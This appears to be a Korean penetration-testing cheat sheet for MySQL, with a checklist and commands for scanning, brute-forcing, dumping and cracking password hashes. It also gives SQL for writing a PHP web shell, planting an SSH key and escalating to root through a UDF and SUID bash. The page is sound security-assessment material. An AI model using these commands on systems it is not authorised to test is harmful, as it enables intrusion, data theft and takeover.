---
sidebar_position: 9
title: MySQL (Port 3306)
---

# MySQL (Port 3306) 취약점 진단

## Overview

**MySQL**: 오픈소스 관계형 데이터베이스 관리 시스템 (포크: MariaDB, Percona Server 등)

**기본 포트**: 3306 (변경 가능)

---

## Assessment Checklist

- [ ] **서비스 버전 확인**: 구버전 구동에 따른 알려진 취약점(1-day) 존재 여부 점검
- [ ] **원격 접근 제어**: Root 계정 원격 로그인 허용 여부 및 특정 IP 접근 통제 여부 확인
- [ ] **기본/약한 계정 정보**: `root:(빈 비밀번호)`, `root:root`, `admin:admin` 등 디폴트/약한 크리덴셜 사용 여부 점검
- [ ] **데이터 보안 설정**: 파일 읽기/쓰기(`FILE` 권한) 허용 여부 및 `secure_file_priv` 설정 결함 점검

---

## 1. Reconnaissance

### 서비스 및 버전 스캔
```bash
# 기본 버전 정보 및 포트 스캔
nmap -p 3306 -sV <target>

# MySQL 관련 기본 안전 스크립트 실행
nmap -p 3306 -sV --script="mysql*" <target>
```

### NSE 스크립트 활용
```bash
# MySQL 상세 정보 수집
nmap -p 3306 --script mysql-info <target>

# 빈 비밀번호(Empty Password) 사용 계정 신속 확인
nmap -p 3306 --script mysql-empty-password <target>

# 인증 정보(크리덴셜)를 이용한 DB 및 사용자 열거
nmap -p 3306 --script mysql-users,mysql-databases --script-args="mysqluser=root,mysqlpass=password" <target>
```

---

## 2. Exploitation

### MySQL 기본 접속
```bash
# 로컬 및 원격 접속
mysql -u root -p
mysql -u <user> -p'<password>' -h <target> -P 3306

# SSL 인증서 오류 발생 시 SSL 비활성화 접속
mysql -u root -p -h <target> --ssl=FALSE
```

### 브루트포스 (Brute-Force) 공격
```bash
# Hydra 이용 단일 유저(root) 패스워드 브루트포스
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>

# Metasploit 보조 모듈 활용
msfconsole
use auxiliary/scanner/mysql/mysql_login
set rhosts <target>
set username root
set pass_file /usr/share/wordlists/rockyou.txt
run
```

### 데이터베이스 원격 덤프 (Dumping)
```bash
# 전체 데이터베이스 덤프
mysqldump -u <user> -p'<password>' -P <port> -h <target> --all-databases > all_db.sql

# 특정 데이터베이스/테이블 덤프
mysqldump -u <user> -p'<password>' -P <port> -h <target> <database> <table> > table.sql

# 조건부 덤프 (WHERE 절 사용: admin 포함 레코드만 추출)
mysqldump -u root -p'root' -h <target> <database> <table> --where="username LIKE '%admin%'" > admin.sql
```

### 해시 크래킹 (Hash Cracking)
데이터베이스 덤프 파일 내에서 해시값을 추출하여 크래킹 수행

```bash
# 1. 덤프 파일 내 INSERT 문에서 비밀번호 해시값만 수동 추출
cat dump.sql | grep -i 'insert into `users`' -A 26 | tr -d "'" | cut -d ',' -f 3 > hashes.txt

# 2. 해시 알고리즘 식별 (MD5, SHA1, SHA256, bcrypt 등)
hash-identifier

# 3. John the Ripper 크래킹 (MD5 예시)
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# 4. Hashcat 크래킹 (MD5: -m 0, SHA1: -m 100, bcrypt: -m 3200)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt --show
```

---

## 3. Advanced Techniques

### 주요 SQL 쿼리 요약
```sql
-- 데이터베이스, 테이블 구조 파악
SHOW DATABASES;
USE <database_name>;
SHOW TABLES;
DESCRIBE <table_name>;

-- 시스템 및 버전 정보 확인
SELECT VERSION();
SELECT USER();
SELECT DATABASE();

-- 문자열 부분 검색 (대소문자 무시)
SELECT * FROM users WHERE LOWER(username) LIKE '%admin%';
```

### 파일 읽기 및 쓰기 (FILE Privilege)
DB 계정에 `FILE` 권한이 존재하고 `secure_file_priv` 설정이 비활성화(빈 값)되어 있을 경우 파일 시스템 접근 가능
```sql
-- 로컬 파일 시스템 읽기 (/etc/passwd)
SELECT LOAD_FILE('/etc/passwd');

-- 로컬 파일 시스템 쓰기 (웹 쉘 또는 SSH 공개키 업로드)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<SSH_PUBLIC_KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

---

## 4. Post-Exploitation

### 시스템 쉘 실행 및 UDF 권한 상승
MySQL 서비스가 root 권한으로 실행 중일 경우, `lib_mysqludf_sys.so` 라이브러리를 활용해 시스템 커맨드 실행 및 권한 상승 달성 가능

```sql
-- (구버전) 시스템 쉘 단순 실행
\! /bin/sh

-- UDF (User Defined Function) 기반 OS 명령어 실행 세팅
USE mysql;
CREATE TABLE foo(line blob);
INSERT INTO foo VALUES(load_file('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM foo INTO dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';

-- SUID 설정 등 최고 관리자 권한 명령어 실행
SELECT sys_exec('chmod +s /bin/bash');
```
